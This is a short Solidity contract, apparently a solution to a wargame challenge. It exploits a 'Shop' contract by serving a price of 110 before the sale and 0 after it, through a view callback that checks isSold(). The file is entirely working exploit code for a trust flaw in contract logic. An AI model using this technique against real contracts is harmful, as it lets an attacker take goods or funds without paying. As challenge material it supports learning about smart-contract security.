// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract HackShop {

    uint public price_value = 110;
    Shop shopInst;

    function hack(address _shop) public {
        shopInst = Shop(_shop);
        shopInst.buy();
    }

    function price() external view returns(uint) {
        bool isSold = shopInst.isSold();
        if (!isSold) {
            return price_value;
        }
        else {
            return 0;
        }
    }

}

interface Shop {
  function buy() external;
  function isSold() external view returns (bool);
}